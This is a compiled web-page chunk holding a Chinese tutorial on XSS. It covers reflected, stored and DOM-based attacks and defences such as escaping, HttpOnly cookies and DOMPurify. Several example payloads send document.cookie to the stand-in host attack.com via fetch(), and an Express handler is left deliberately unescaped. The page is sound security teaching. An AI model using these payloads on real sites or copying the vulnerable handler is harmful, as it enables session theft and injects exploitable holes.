import{_ as s,o as a,c as n,Q as p}from"./chunks/framework.20999013.js";const A=JSON.parse('{"title":"什么是 XSS 攻击？","description":"","frontmatter":{"title":"什么是 XSS 攻击？","date":"2020-11-20T20:39:27.000Z","sidebar":"auto","tags":["xss","浏览器安全"],"categories":["浏览器"]},"headers":[],"relativePath":"safe/xss.md","lastUpdated":1717400793000}'),l={name:"safe/xss.md"},o=p(`<details class="details custom-block"><summary>为什么 React 元素有一个 <code>$$typeof</code> 属性？</summary><p>目的是为了防止 XSS 攻击。因为 Synbol 无法被序列化，所以 React 可以通过有没有 <code>$$typeof</code> 属性来断出当前的 element 对象是从数据库来的还是自己生成的。</p><p>如果没有 <code>$$typeof</code> 这个属性，react 会拒绝处理该元素。</p></details><details class="details custom-block"><summary>快速预览</summary><p>反射型 XSS 攻击的手段就是诱导用户点击，这种攻击是一次性的，用户点击就中招，不点就没事，危害性不如存储型的大，但是小白用户很容易被盗号。</p><p>存储型 XSS 攻击范围广，受害面积大，且不容易及时发现和排查，一定要多加小心，对于用户输入的任何内容都不要完全信任，对于动态渲染的文本一定要进行转义。</p><p>DOM 型 XSS 攻击随着单页面应用普及和流行愈发常见，因为在单页面应用中 JS 经常操作 DOM，而 DOM 型 XSS 攻击就是利用了浏览器解析机制，因此很容易触发 DOM 型 XSS 攻击。不过好在大部分前端框架，例如 Vue、Angular 都内置 DOM 型 XSS 攻击的防御机制。</p></details><p><code>XSS</code> 也即跨站脚本攻击，攻击出现的原因一般是因为 Web 程序对<strong>用户的输入过滤不足</strong>导致的一种漏洞，攻击者可以把恶意的脚本代码注入到网页之中，当其他用户浏览时就会执行其中的恶意代码，对受害者产生各种攻击。XSS 一般分为三种类型：</p><p><strong>反射型</strong>、<strong>存储型</strong>、<strong>DOM 型</strong></p><h2 id="反射型-url" tabindex="-1">反射型（url） <a class="header-anchor" href="#反射型-url" aria-label="Permalink to &quot;反射型（url）&quot;">​</a></h2><p>反射型 XSS 攻击的恶意脚本并没有被存储到后端数据库中，而是诱导用户点击某个精心拼接的恶意链接，从而达到攻击的目的。</p><p>:::: tabs</p><p>::: tab 举个例子</p><p>一个常见的场景是用户在某电影网站搜索，假如请求地址是：</p><div class="language-js"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">https</span><span style="color:#89DDFF;">:</span><span style="color:#676E95;font-style:italic;">//xxx.com/movies?q=功夫熊猫</span></span>
<span class="line"></span></code></pre></div><p>在后台返回的结果页中，会显示用户搜索的电影名，而攻击者拼接了一个极度恶意的链接：</p><div class="language-js"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">https</span><span style="color:#89DDFF;">:</span><span style="color:#676E95;font-style:italic;">//xxx.com/movies?q=功夫熊猫&lt;script&gt;fetch(\`https://attack.com?cookie=\${document.cookie}\`)&lt;/script&gt;</span></span>
<span class="line"></span></code></pre></div><p>如果用户点击了这个恶意链接，cookie 立马被盗。</p><p>:::</p><p>::: tab 代码实现</p><div class="language-js"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">const</span><span style="color:#BABED8;"> express </span><span style="color:#89DDFF;">=</span><span style="color:#BABED8;"> </span><span style="color:#82AAFF;">require</span><span style="color:#BABED8;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">express</span><span style="color:#89DDFF;">&#39;</span><span style="color:#BABED8;">)</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#C792EA;">const</span><span style="color:#BABED8;"> app </span><span style="color:#89DDFF;">=</span><span style="color:#BABED8;"> </span><span style="color:#82AAFF;">express</span><span style="color:#BABED8;">()</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BABED8;">app</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">get</span><span style="color:#BABED8;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">/xss</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#BABED8;"> </span><span style="color:#89DDFF;">(</span><span style="color:#BABED8;font-style:italic;">req</span><span style="color:#89DDFF;">,</span><span style="color:#BABED8;"> </span><span style="color:#BABED8;font-style:italic;">res</span><span style="color:#89DDFF;">)</span><span style="color:#BABED8;"> </span><span style="color:#C792EA;">=&gt;</span><span style="color:#BABED8;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#F07178;">  </span><span style="color:#BABED8;">res</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">send</span><span style="color:#F07178;">(</span><span style="color:#89DDFF;">\`</span><span style="color:#C3E88D;">你的搜索内容 </span><span style="color:#89DDFF;">\${</span><span style="color:#BABED8;">req</span><span style="color:#89DDFF;">.</span><span style="color:#BABED8;">query</span><span style="color:#89DDFF;">.</span><span style="color:#BABED8;">search</span><span style="color:#89DDFF;">}\`</span><span style="color:#F07178;">)</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#89DDFF;">}</span><span style="color:#BABED8;">)</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BABED8;">app</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">listen</span><span style="color:#BABED8;">(</span><span style="color:#F78C6C;">3000</span><span style="color:#89DDFF;">,</span><span style="color:#BABED8;"> </span><span style="color:#89DDFF;">()</span><span style="color:#BABED8;"> </span><span style="color:#C792EA;">=&gt;</span><span style="color:#BABED8;"> console</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">log</span><span style="color:#BABED8;">(</span><span style="color:#89DDFF;">\`</span><span style="color:#C3E88D;">请打开网址 http://localhost:3000/xss?search=Kobe</span><span style="color:#89DDFF;">\`</span><span style="color:#BABED8;">))</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span></code></pre></div><p>打开：<code>http://localhost:3000/xss?search=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>, 可以发现 cookie 被读取了，这是多么危险的事情</p><p>:::</p><p>::::</p><p>造成反射型 XSS 攻击的原因就是服务端没过滤，所以解决方案也很简单，就是在服务器对用户输入进行过滤，过滤方案一般有很多，</p><div class="language-js"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">const</span><span style="color:#BABED8;"> tpl </span><span style="color:#89DDFF;">=</span><span style="color:#BABED8;"> req</span><span style="color:#89DDFF;">.</span><span style="color:#BABED8;">query</span><span style="color:#89DDFF;">.</span><span style="color:#BABED8;">q</span></span>
<span class="line"><span style="color:#BABED8;">  </span><span style="color:#89DDFF;">?</span><span style="color:#BABED8;"> </span><span style="color:#89DDFF;">\`</span><span style="color:#C3E88D;">&lt;h3&gt;「</span><span style="color:#89DDFF;">\${</span><span style="color:#82AAFF;">encodeURIComponent</span><span style="color:#BABED8;">(req</span><span style="color:#89DDFF;">.</span><span style="color:#BABED8;">query</span><span style="color:#89DDFF;">.</span><span style="color:#BABED8;">q)</span><span style="color:#89DDFF;">}</span><span style="color:#C3E88D;">」的搜索结果为：&lt;/h3&gt;</span><span style="color:#89DDFF;">\${</span><span style="color:#82AAFF;">Array</span><span style="color:#BABED8;">(</span><span style="color:#F78C6C;">30</span><span style="color:#BABED8;">)</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">fill</span><span style="color:#BABED8;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">x</span><span style="color:#89DDFF;">&#39;</span><span style="color:#BABED8;">)</span><span style="color:#89DDFF;">}\`</span></span>
<span class="line"><span style="color:#BABED8;">  </span><span style="color:#89DDFF;">:</span><span style="color:#BABED8;"> </span><span style="color:#89DDFF;">\`</span><span style="color:#C3E88D;">请输入搜索的电影</span><span style="color:#89DDFF;">\`</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span></code></pre></div><p>还有一种方式是写一个函数替换掉那些 <code>&lt;</code>、<code>&amp;</code> 等特殊字符：</p><div class="language-js"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">function</span><span style="color:#BABED8;"> </span><span style="color:#82AAFF;">encodeHTML</span><span style="color:#89DDFF;">(</span><span style="color:#BABED8;font-style:italic;">str</span><span style="color:#89DDFF;">)</span><span style="color:#BABED8;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#F07178;">  </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#F07178;"> </span><span style="color:#BABED8;">str</span></span>
<span class="line"><span style="color:#F07178;">    </span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">replace</span><span style="color:#F07178;">(</span><span style="color:#89DDFF;">/</span><span style="color:#C3E88D;">&amp;</span><span style="color:#89DDFF;">/</span><span style="color:#F78C6C;">g</span><span style="color:#89DDFF;">,</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&amp;amp;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#F07178;">)</span></span>
<span class="line"><span style="color:#F07178;">    </span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">replace</span><span style="color:#F07178;">(</span><span style="color:#89DDFF;">/</span><span style="color:#C3E88D;">&quot;</span><span style="color:#89DDFF;">/</span><span style="color:#F78C6C;">g</span><span style="color:#89DDFF;">,</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&amp;quot;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#F07178;">)</span></span>
<span class="line"><span style="color:#F07178;">    </span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">replace</span><span style="color:#F07178;">(</span><span style="color:#89DDFF;">/</span><span style="color:#C3E88D;">&#39;</span><span style="color:#89DDFF;">/</span><span style="color:#F78C6C;">g</span><span style="color:#89DDFF;">,</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&amp;apos;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#F07178;">)</span></span>
<span class="line"><span style="color:#F07178;">    </span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">replace</span><span style="color:#F07178;">(</span><span style="color:#89DDFF;">/</span><span style="color:#C3E88D;">&lt;</span><span style="color:#89DDFF;">/</span><span style="color:#F78C6C;">g</span><span style="color:#89DDFF;">,</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&amp;lt;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#F07178;">)</span></span>
<span class="line"><span style="color:#F07178;">    </span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">replace</span><span style="color:#F07178;">(</span><span style="color:#89DDFF;">/</span><span style="color:#C3E88D;">&gt;</span><span style="color:#89DDFF;">/</span><span style="color:#F78C6C;">g</span><span style="color:#89DDFF;">,</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&amp;gt;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#F07178;">)</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"></span></code></pre></div><p>另外，如果后端登录验证是基于 Cookie 的话，一定要设置其属性为 <code>HttpOnly</code>，这样攻击者无法利用 JS 脚本获取到 Cookie 了。</p><h2 id="存储型-表单" tabindex="-1">存储型（表单） <a class="header-anchor" href="#存储型-表单" aria-label="Permalink to &quot;存储型（表单）&quot;">​</a></h2><p>与反射型不同，存储型 XSS 攻击是指当用户的输入包含了恶意脚本，服务端转义就存储到数据库，访问页面会触发恶意脚本执行，而导致的攻击。</p><p>假如在某网站上有一篇爆款文章：<code>https://xxx.com/articles/1</code></p><p>攻击者在文章下面发表了一篇评论，内容中包含了 script 脚本：</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">文章写的真棒！&lt;script&gt;fetch(</span><span style="color:#89DDFF;">\`</span><span style="color:#FFCB6B;">http://attack.com/cookies?cookie</span><span style="color:#C3E88D;">=</span><span style="color:#89DDFF;">\${</span><span style="color:#BABED8;">document</span><span style="color:#C3E88D;">.</span><span style="color:#BABED8;">cookie</span><span style="color:#89DDFF;">}\`</span><span style="color:#BABED8;">)&lt;/script&gt;</span></span>
<span class="line"></span></code></pre></div><p>如果服务端直接把评论字符串保存到数据库了，下次只要有用户访问该文章时，包含恶意脚本的评论内容被返回，把当前用户的 cookie 发送到攻击者的服务器！</p><p>可以看到，用户的 Cookie 马上被发送到了攻击者的服务器。其实这种获取 Cookie 的方式还算小打小闹了，只要能够利用 xss 注入 script，黑客真的是可以「为所欲为」，例如黑客通过操作 DOM 的方式，分分钟把你的网站变成赌博网站、色情网站...，</p><p>可以看到，存储型 XSS 也是因为恶意代码未经转义直接被插入到响应的 HTML 里的，然后被浏览器执行导致攻击，所以解决方案也是对用户输入进行过滤，过滤方案与上面讲的反射型一致.</p><h2 id="dom-型-onerror" tabindex="-1">DOM 型（onerror） <a class="header-anchor" href="#dom-型-onerror" aria-label="Permalink to &quot;DOM 型（onerror）&quot;">​</a></h2><p>DOM 型 XSS 与反射型或存储型 XSS 的区别在于，DOM 型在服务器返回的网页或脚本中是看不到恶意代码的，而是在更新 DOM 树的时候触发了恶意脚本的执行。</p><p>我们来看一则模拟案例，前端开发人员未经过滤就直接把用户输入插入到 HTML 中：</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">input</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">id</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">input</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">type</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">text</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> /&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">button</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">onclick</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#BABED8;">container</span><span style="color:#89DDFF;">.</span><span style="color:#BABED8;">innerHTML</span><span style="color:#C3E88D;"> </span><span style="color:#89DDFF;">=</span><span style="color:#C3E88D;"> </span><span style="color:#BABED8;">input</span><span style="color:#89DDFF;">.</span><span style="color:#BABED8;">value</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">&gt;</span><span style="color:#BABED8;">点击</span><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">button</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">p</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">id</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">container</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">&gt;&lt;/</span><span style="color:#F07178;">p</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"></span></code></pre></div><p>试想一下，如果此时用户输入了下面一段恶意脚本的话会发生什么？</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#BABED8;">script</span><span style="color:#89DDFF;">&gt;</span><span style="color:#BABED8;">fetch</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">\`</span><span style="color:#FFCB6B;">https://attack.com?cookie</span><span style="color:#C3E88D;">=</span><span style="color:#89DDFF;">\${</span><span style="color:#BABED8;">document</span><span style="color:#C3E88D;">.</span><span style="color:#BABED8;">cookie</span><span style="color:#89DDFF;">}\`</span><span style="color:#89DDFF;">)&lt;</span><span style="color:#BABED8;">/script</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"></span></code></pre></div><p>值得庆幸的是，大部分现代浏览器都实现了 HTML5 的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML" target="_blank" rel="noreferrer">安全规范</a></p><p>但是这就足够安全了吗？非也，请看下面的输入：</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">img</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">src</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">x</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">onerror</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#82AAFF;">fetch</span><span style="color:#C3E88D;">(</span><span style="color:#89DDFF;">\`</span><span style="color:#C3E88D;">http:</span><span style="color:#676E95;font-style:italic;">//attack.com/cookies?cookie=\${document.cookie}\`)</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> /&gt;</span></span>
<span class="line"></span></code></pre></div><p>恶意脚本依然在 onerror 回调中被触发了！</p><p>这里推荐使用 <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noreferrer">DOMPurify</a> 库对用户的输入进行过滤，然后再使用 innerHTML 插入到 DOM 中。</p><p><a href="https://juejin.cn/post/6867184627393265677" target="_blank" rel="noreferrer">参考自 XSS 攻防实战</a></p>`,44),e=[o];function t(c,r,D,F,y,i){return a(),n("div",null,e)}const d=s(l,[["render",t]]);export{A as __pageData,d as default};